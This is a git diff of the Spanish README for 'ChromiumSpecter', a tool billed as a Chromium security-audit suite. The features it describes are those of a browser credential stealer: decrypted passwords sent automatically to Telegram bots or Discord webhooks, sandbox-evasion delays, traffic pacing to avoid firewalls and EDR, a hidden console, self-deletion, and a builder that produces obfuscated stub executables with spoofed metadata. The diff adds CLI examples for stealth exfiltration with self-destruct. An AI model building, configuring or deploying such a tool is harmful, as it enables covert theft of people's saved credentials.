@@ -13,8 +13,14 @@
 
 *La suite definitiva de grado táctico para auditorías de seguridad en navegadores Chromium.*
 
-[Reportar Bug](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues) | [Solicitar Mejora](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues)
+[Reportar Bug](https://github.com/ANONIMO432HZ/ChromiumSpecter/issues) | [Solicitar Mejora](https://github.com/ANONIMO432HZ/ChromiumSpecter/issues)
 
+</div>
+
+---
+
+<div align="center">
+  <img src="screenshots/dashboard.png" width="800" alt="ChromiumSpecter Dashboard">
 </div>
 
 ---
@@ -25,28 +31,77 @@
 
 ### 🌟 Características Destacadas
 
-*   **🖥️ Dashboard de Alta Densidad**: Interfaz gráfica profesional con consolas en tiempo real, estadísticas dinámicas y gestión de resultados mediante pools de widgets optimizados.
-*   **🕵️ Motor de Sigilo (Tactical Stealth)**:
-    *   **Startup Delay**: Selector de retraso inicial (0-300s) para evadir análisis en Sandbox y Sandbox inteligentes.
-    *   **Inter-file Delay (`send_delay`)**: Pausas personalizables entre envíos para prevenir picos de tráfico que alerten a firewalls o EDRs.
-    *   **Startup Hidden**: Opción para ejecutar el binario sin consola y de forma totalmente invisible.
-*   **🚀 Exfiltración Inteligente**:
-    *   **Auto-Exfiltración**: Configuración para envío automático inmediato tras la auditoría.
-    *   **Multi-Canal**: Soporte nativo para **Telegram Bots** y **Discord Webhooks** con redundancia.
-    *   **Persistencia Local**: Guardado seguro de configuraciones de exfiltración para uso recurrente.
-*   **🛠️ Builder Visual Integrado**:
-    *   Generación de stubs personalizados con **Inyección Dinámica** de parámetros.
-    *   **Spoofing de Metadatos**: Presets integrados (Google, Microsoft, Intel) para clonar firmas de ejecutables legítimos.
-    *   **Compresión y Ofuscación**: Soporte nativo para UPX y capas de ofuscación híbrida.
+* **🖥️ Dashboard de Alta Densidad**: Interfaz gráfica profesional con consolas en tiempo real, estadísticas dinámicas y gestión de resultados mediante pools de widgets optimizados.
+* **🕵️ Motor de Sigilo (Tactical Stealth)**:
+  * **Startup Delay**: Selector de retraso inicial (0-300s) para evadir análisis en Sandbox y Sandbox inteligentes.
+  * **Inter-file Delay (`send_delay`)**: Pausas personalizables entre envíos para prevenir picos de tráfico que alerten a firewalls o EDRs.
+  * **Anti-Forensics**: Soporte para **Autodestrucción Táctica** (Auto-Delete) del binario tras la ejecución.
+  * **Protocolo de Pánico**: Saneamiento total del entorno de auditoría con un solo clic.
+
+<div align="center">
+  <img src="screenshots/exit_self-destroy.png" width="600" alt="ChromiumSpecter Panic Exit">
+</div>
+
+### 🚀 Exfiltración Inteligente
+
+* **Auto-Exfiltración**: Configuración para envío automático inmediato tras la auditoría.
+* **Multi-Canal**: Soporte nativo para **Telegram Bots** y **Discord Webhooks** con redundancia.
+* **Persistencia Local**: Guardado seguro de configuraciones de exfiltración para uso recurrente.
+
+### 🛠️ Builder Visual Integrado
+
+Generación de stubs personalizados con **Inyección Dinámica** de parámetros.
+**Spoofing de Metadatos**: Presets integrados para clonar firmas.
+**Compresión y Ofuscación**: Soporte nativo para UPX y PyArmor.
+
+<div align="center">
+  <img src="screenshots/builder.png" width="800" alt="ChromiumSpecter Builder">
+</div>
 
 ---
 
 ## 🚀 Flujo de Trabajo Táctico
 
-1.  **Configuración**: Define tus tokens de Telegram/Discord en el Tab de **Exfiltración** y guárdalos.
-2.  **Auditoría**: Lanza el escaneo desde el Dashboard. Puedes activar la **Auto-exfiltración** para automatizar el ciclo completo.
-3.  **Inspección**: Visualiza las credenciales descifradas en tiempo real en el Tab de **Resultados**.
-4.  **Despliegue**: Usa el **Builder** para generar un `.exe` con tus credenciales embebidas (Base64) y presets de sigilo configurados.
+1. **Configuración**: Define tus tokens de Telegram/Discord en el Tab de **Exfiltración** y guárdalos.
+2. **Auditoría**: Lanza el escaneo desde el Dashboard. Puedes activar la **Auto-exfiltración** y **Autodestrucción** para un ciclo de "ejecución y olvido".
+3. **Inspección**: Visualiza las credenciales descifradas en tiempo real en el Tab de **Resultados**.
+4. **Despliegue**: Usa el **Builder** para generar un `.exe` con tus credenciales embebidas (Base64) y presets de sigilo configurados.
+
+## 🖥️ Uso Avanzado (CLI)
+
+El motor principal (`main.py`) puede ejecutarse de forma independiente sin la interfaz gráfica, ideal para automatizaciones o despliegues rápidos via terminal.
+
+```bash
+# Auditoría básica
+python main.py
+
+# Auditoría con exfiltración automática a Discord
+python main.py --webhook "https://discord.com/api/webhooks/..." --self-destruct
+
+# Auditoría silenciosa (sin consola) y guardado en carpeta personalizada
+python main.py --stealth --output-dir "C:\temp\logs"
+```
+
+### Parámetros Disponibles (CLI)
+
+| Grupo | Parámetro | Descripción |
+| :--- | :--- | :--- |
+| **Exfiltración** | `--webhook` | Discord Webhook URL para envío de reportes. |
+| | `--tg-token` | Token del bot de Telegram. |
+| | `--tg-chat-id` | ID del chat o canal de Telegram. |
+| | `--no-exfil` | Desactiva el envío externo de datos. |
+| **Reportes** | `--no-html` | No genera el reporte visual en HTML. |
+| | `--no-csv` | No genera el reporte estructurado en CSV. |
+| | `--json` | Genera un reporte adicional en formato JSON. |
+| | `--output-dir` | Carpeta de salida (default: `.audit`). |
+| **Motor** | `--browser` | Filtra por un navegador específico (chrome, brave, etc). |
+| | `--delay` | Retraso inicial (segundos) antes de actuar. |
+| | `--stealth` | Oculta la ventana de consola inmediatamente al arrancar. |
+| | `--auto-kill` | Cierra navegadores automáticamente si la base de datos está bloqueada. |
+| | `--self-destruct` | 💥 **Elimina el ejecutable** tras finalizar el ciclo. |
+| | `--no-wipe` | No borra los reportes locales tras enviarlos. |
+| | `--clean` | Limpia todos los reportes antiguos en la carpeta de salida. |
+| | `--debug` | Muestra logs detallados de depuración. |
 
 ---
 
@@ -58,8 +113,8 @@ Al usar el **Builder**, puedes inyectar los siguientes comportamientos en tu bin
 | :--- | :--- | :--- |
 | **Delay Inicial** | 0s - 300s | Retraso antes de la primera acción (Anti-Sandbox). |
 | **Send Delay** | 0s - 10s | Pausa entre archivos enviados (Evasión de tráfico). |
-| **Webhook Timeout**| 5s - 60s | Tiempo de espera para conexiones inestables. |
-| **Auto-Exfiltrate**| Checkbox | Activa el envío automático sin intervención. |
+| **Webhook Timeout** | 5s - 60s | Tiempo de espera para conexiones inestables. |
+| **Auto-Exfiltrate** | Checkbox | Activa el envío automático sin intervención. |
 | **UAC Prompt** | Toggle | Solicita privilegios de administrador si es necesario. |
 
 ---
@@ -80,8 +135,8 @@ Al usar el **Builder**, puedes inyectar los siguientes comportamientos en tu bin
 
 ```bash
 # 1. Clonar el repositorio
-git clone https://github.com/ANONIMO432HZ/decrypt-chromium-suite.git
-cd decrypt-chromium-suite
+git clone https://github.com/ANONIMO432HZ/ChromiumSpecter
+cd ChromiumSpecter
 
 # 2. Instalar dependencias
 pip install -r requirements.txt
@@ -95,13 +150,17 @@ python gui_app.py
 ## 📡 Configuración de Exfiltración
 
 ### 🤖 Telegram
+
 Requiere **Token** y **Chat ID**.
-*   Obtén el token con `@BotFather`.
-*   Obtén tu ID con `@userinfobot`.
+
+* Obtén el token con `@BotFather`.
+* Obtén tu ID con `@userinfobot`.
 
 ### 🎮 Discord
+
 Requiere **Webhook URL**.
-*   Configúralo en: Ajustes del Canal -> Integraciones -> Webhooks.
+
+* Configúralo en: Ajustes del Canal -> Integraciones -> Webhooks.
 
 ---
 
